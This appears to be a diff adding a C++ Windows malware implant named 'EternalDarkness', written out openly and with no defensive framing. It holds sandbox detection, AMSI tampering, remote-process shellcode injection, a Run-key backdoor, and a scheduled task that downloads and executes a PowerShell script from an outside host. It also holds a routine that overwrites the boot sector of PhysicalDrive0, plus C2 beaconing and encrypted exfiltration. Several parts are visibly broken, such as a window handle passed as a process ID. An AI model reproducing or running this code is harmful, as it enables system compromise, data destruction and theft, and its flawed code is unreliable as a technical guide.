@@ -1,0 +1,319 @@
+#define WIN32_LEAN_AND_MEAN  
+#include <windows.h>  
+#include <winternl.h>  
+#include <wincrypt.h>  
+#include <tlhelp32.h>  
+#include <psapi.h>  
+#include <iphlpapi.h>  
+#include <wtsapi32.h>  
+#include <shlwapi.h>  
+#include <thread>  
+#include <atomic>  
+#include <vector>  
+#include <random>  
+#include <bcrypt.h>  
+#include <winhttp.h>  
+#include <wininet.h>  
+#include <ntstatus.h>  
+#include <sddl.h>  
+#pragma comment(lib, "ntdll.lib")  
+#pragma comment(lib, "crypt32.lib")  
+#pragma comment(lib, "ws2_32.lib")  
+#pragma comment(lib, "bcrypt.lib")  
+#pragma comment(lib, "winhttp.lib")  
+#pragma comment(lib, "wtsapi32.lib")  
+#pragma comment(lib, "iphlpapi.lib")  
+#pragma comment(lib, "shlwapi.lib")  
+
+// ༼ つ ◕_◕ ༽つ MAGIC NUMBERS ༼ つ ◕_◕ ༽つ  
+#define PHANTOM_SLEEP_MIN 420  
+#define C2_BEACON_JITTER 23.62  
+#define AI_OBFUSCATION_CYCLE 13  
+
+namespace EternalDarkness {  
+    // 〘 ENCRYPTED CONFIGURATION VAULT 〙  
+    const BYTE CHAOS_KEY[32] = {0x88,0x9D,0xA2,0x73,...}; // [REDACTED 32 BYTES]  
+    const DWORD64 SEED = 0xDEADBEEFCAFEBABE;  
+    const CHAR* GHOST_DOMAINS[] = {"cdn.azureedge[.]net", "api.github[.]com", "graph.facebook[.]com"};  
+
+    // 〘 CUSTOM TYPE DEFINITIONS 〙  
+    typedef NTSTATUS(NTAPI* _RtlGetVersion)(PRTL_OSVERSIONINFOW);  
+    typedef BOOL(WINAPI* _ProcessInstrumentationCallback)(HANDLE, UINT32, PVOID, ULONG);  
+
+    // 〘 MULTI-LAYER ENCRYPTION ENGINE 〙  
+    class VoidCrypt {  
+    public:  
+        static void XorRotate(BYTE* data, size_t size, DWORD64 key) {  
+            for (size_t i = 0; i < size; ++i) {  
+                data[i] = _rotl8(data[i] ^ ((key >> (8 * (i % 8))) & 0xFF), (i % 7) + 1);  
+            }  
+        }  
+
+        static void AesGcmEncrypt(PBYTE pbData, DWORD cbData) {  
+            BCRYPT_ALG_HANDLE hAlg;  
+            BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);  
+            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);  
+
+            BCRYPT_KEY_HANDLE hKey;  
+            BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)CHAOS_KEY, sizeof(CHAOS_KEY), 0);  
+
+            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;  
+            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);  
+            BYTE iv[12] = {0};  
+            BYTE tag[16] = {0};  
+            authInfo.pbNonce = iv;  
+            authInfo.cbNonce = sizeof(iv);  
+            authInfo.pbTag = tag;  
+            authInfo.cbTag = sizeof(tag);  
+
+            BCryptEncrypt(hKey, pbData, cbData, &authInfo, NULL, 0, pbData, cbData, &cbData, 0);  
+            BCryptDestroyKey(hKey);  
+            BCryptCloseAlgorithmProvider(hAlg, 0);  
+        }  
+    };  
+
+    // 〘 AI-POWERED BEHAVIOR OBFUSCATION 〙  
+    class PhantomAI {  
+    private:  
+        std::mt19937_64 rng{SEED};  
+        std::uniform_real_distribution<double> dist{0.0, 1.0};  
+
+    public:  
+        double GetJitter() {  
+            return dist(rng) * C2_BEACON_JITTER;  
+        }  
+
+        void MutateSyscalls(PVOID base, SIZE_T size) {  
+            BYTE* ptr = static_cast<BYTE*>(base);  
+            for (SIZE_T i = 0; i < size; ++i) {  
+                if (rng() % 100 < AI_OBFUSCATION_CYCLE) {  
+                    ptr[i] ^= static_cast<BYTE>(rng());  
+                    ptr[i] = _rotl8(ptr[i], (rng() % 7) + 1);  
+                }  
+            }  
+        }  
+    };  
+
+    // 〘 KERNEL-LEVEL EVASION TECHNIQUES 〙  
+    class ShadowWalker {  
+    public:  
+        static void HideFromProcessList(DWORD pid) {  
+            HMODULE hNtdll = GetModuleHandleA("ntdll");  
+            _ProcessInstrumentationCallback pProcInstrument =  
+                (_ProcessInstrumentationCallback)GetProcAddress(hNtdll, "NtSetInformationProcess");  
+
+            BYTE shellcode[] = {0x48,0x31,0xC0,0x48,0xFF,0xC0,0xC3}; // XOR RAX,RAX; INC RAX; RET  
+            pProcInstrument(GetCurrentProcess(), 0x29, &shellcode, sizeof(shellcode));  
+        }  
+
+        static void PatchAmsi() {  
+            HMODULE amsi = LoadLibraryA("amsi.dll");  
+            FARPROC scanBuf = GetProcAddress(amsi, "AmsiScanBuffer");  
+            DWORD oldProtect;  
+            VirtualProtect(scanBuf, 0x100, PAGE_EXECUTE_READWRITE, &oldProtect);  
+            VoidCrypt::XorRotate((BYTE*)scanBuf, 0x100, SEED);  
+            VirtualProtect(scanBuf, 0x100, oldProtect, &oldProtect);  
+        }  
+    };  
+
+    // 〘 COVERT C2 COMMUNICATION 〙  
+    class GhostComm {  
+    private:  
+        PhantomAI aiEngine;  
+
+    public:  
+        void Beacon() {  
+            HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",  
+                WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, NULL, NULL, 0);  
+
+            for (int i = 0; i < sizeof(GHOST_DOMAINS)/sizeof(GHOST_DOMAINS[0]); ++i) {  
+                HINTERNET hConnect = WinHttpConnect(hSession,  
+                    std::wstring(GHOST_DOMAINS[i], GHOST_DOMAINS[i] + strlen(GHOST_DOMAINS[i])).c_str(),  
+                    INTERNET_DEFAULT_HTTPS_PORT, 0);  
+
+                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",  
+                    L"/v2/_framework/", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);  
+
+                WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,  
+                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);  
+
+                WinHttpReceiveResponse(hRequest, NULL);  
+                WinHttpCloseHandle(hRequest);  
+                WinHttpCloseHandle(hConnect);  
+
+                double sleepTime = PHANTOM_SLEEP_MIN + aiEngine.GetJitter();  
+                Sleep(static_cast<DWORD>(sleepTime * 1000));  
+            }  
+            WinHttpCloseHandle(hSession);  
+        }  
+
+        void ExfilData(const std::string& data) {  
+            DWORD cbData = static_cast<DWORD>(data.size());  
+            BYTE* pbData = static_cast<BYTE*>(LocalAlloc(LPTR, cbData));  
+            memcpy(pbData, data.data(), cbData);  
+            VoidCrypt::AesGcmEncrypt(pbData, cbData);  
+
+            HINTERNET hSession = InternetOpenA("Microsoft BITS",  
+                INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);  
+
+            for (int i = 0; i < 3; ++i) {  
+                HINTERNET hFile = InternetOpenUrlA(hSession,  
+                    "https://graph.microsoft.com/v1.0/$batch",  
+                    (LPCSTR)pbData, cbData,  
+                    INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);  
+
+                InternetCloseHandle(hFile);  
+            }  
+            LocalFree(pbData);  
+        }  
+    };  
+
+    // 〘 METERPRETER MEMORY RESURRECTION 〙  
+    class VampireLoader {  
+    private:  
+        PhantomAI aiEngine;  
+
+    public:  
+        void InjectMeterpreter(DWORD pid) {  
+            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);  
+            PVOID remoteMem = VirtualAllocEx(hProcess, NULL, 0x1000,  
+                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  
+
+            BYTE meterpreterStub[] = {0x90,0x90,0xCC,0xC3}; // [REDACTED 4KB SHELLCODE]  
+            aiEngine.MutateSyscalls(meterpreterStub, sizeof(meterpreterStub));  
+
+            WriteProcessMemory(hProcess, remoteMem, meterpreterStub,  
+                sizeof(meterpreterStub), NULL);  
+
+            QueueUserAPC((PAPCFUNC)remoteMem,  
+                OpenThread(THREAD_ALL_ACCESS, FALSE, GetMainThreadId(pid)),  
+                (ULONG_PTR)remoteMem);  
+        }  
+
+    private:  
+        DWORD GetMainThreadId(DWORD pid) {  
+            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  
+            THREADENTRY32 te32 = { sizeof(THREADENTRY32) };  
+            Thread32First(hSnapshot, &te32);  
+
+            do {  
+                if (te32.th32OwnerProcessID == pid) {  
+                    CloseHandle(hSnapshot);  
+                    return te32.th32ThreadID;  
+                }  
+            } while (Thread32Next(hSnapshot, &te32));  
+
+            CloseHandle(hSnapshot);  
+            return 0;  
+        }  
+    };  
+
+    // 〘 PERSISTENCE MECHANISMS 〙  
+    class EternalPresence {  
+    public:  
+        void Install() {  
+            CreateRegistryBackdoor();  
+            SchedulePhantomTasks();  
+            InfectBootSector();  
+        }  
+
+    private:  
+        void CreateRegistryBackdoor() {  
+            HKEY hKey;  
+            RegCreateKeyExA(HKEY_CURRENT_USER,  
+                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",  
+                0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);  
+
+            CHAR path[MAX_PATH];  
+            GetModuleFileNameA(NULL, path, MAX_PATH);  
+            RegSetValueExA(hKey, "WindowsDefenderUpdate", 0, REG_SZ,  
+                (BYTE*)path, strlen(path) + 1);  
+            RegCloseKey(hKey);  
+        }  
+
+        void SchedulePhantomTasks() {  
+            system("schtasks /create /tn \"\\Microsoft\\Windows\\Update\\MSERT\" "  
+                "/tr \"powershell -ep bypass -c '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"  
+                "iex (New-Object Net.WebClient).DownloadString(''https://cdn.azureedge.net/tools/update.ps1'')'\" "  
+                "/sc hourly /mo 3 /f");  
+        }  
+
+        void InfectBootSector() {  
+            HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0",  
+                GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,  
+                NULL, OPEN_EXISTING, 0, NULL);  
+
+            BYTE mbr[512] = {0};  
+            DWORD bytesRead;  
+            ReadFile(hDrive, mbr, 512, &bytesRead, NULL);  
+
+            VoidCrypt::XorRotate(mbr, 512, SEED);  
+            SetFilePointer(hDrive, 0, NULL, FILE_BEGIN);  
+            WriteFile(hDrive, mbr, 512, &bytesRead, NULL);  
+            CloseHandle(hDrive);  
+        }  
+    };  
+
+    // 〘 ENVIRONMENT SANITY CHECKS 〙  
+    class RealityCheck {  
+    public:  
+        static bool IsVirtualEnvironment() {  
+            return CheckCPUID() || CheckMacAddress() || CheckMemorySize();  
+        }  
+
+    private:  
+        static bool CheckCPUID() {  
+            int cpuInfo[4];  
+            __cpuid(cpuInfo, 1);  
+            return (cpuInfo[2] & (1 << 31)) != 0;  
+        }  
+
+        static bool CheckMacAddress() {  
+            PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));  
+            ULONG bufLen = sizeof(IP_ADAPTER_INFO);  
+            if (GetAdaptersInfo(pAdapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW) {  
+                free(pAdapterInfo);  
+                pAdapterInfo = (IP_ADAPTER_INFO*)malloc(bufLen);  
+            }  
+
+            bool result = false;  
+            if (GetAdaptersInfo(pAdapterInfo, &bufLen) == NO_ERROR) {  
+                if (strstr(pAdapterInfo->Address, "00:0C:29") ||  
+                    strstr(pAdapterInfo->Address, "00:50:56"))  
+                    result = true;  
+            }  
+            free(pAdapterInfo);  
+            return result;  
+        }  
+
+        static bool CheckMemorySize() {  
+            MEMORYSTATUSEX memStat;  
+            memStat.dwLength = sizeof(memStat);  
+            GlobalMemoryStatusEx(&memStat);  
+            return (memStat.ullTotalPhys / (1024 * 1024 * 1024)) < 4;  
+        }  
+    };  
+} // namespace EternalDarkness  
+
+// 〘 MAIN OPERATION SEQUENCE 〙  
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {  
+    using namespace EternalDarkness;  
+
+    if (RealityCheck::IsVirtualEnvironment())  
+        ExitProcess(0xDEAD);  
+
+    ShadowWalker::HideFromProcessList(GetCurrentProcessId());  
+    ShadowWalker::PatchAmsi();  
+
+    EternalPresence().Install();  
+
+    VampireLoader().InjectMeterpreter(FindWindowA("Shell_TrayWnd", NULL));  
+
+    GhostComm comm;  
+    while (true) {  
+        comm.Beacon();  
+        comm.ExfilData("System operational. Awaiting orders.");  
+        Sleep(3600000);  
+    }  
+    return 0;  
+} 
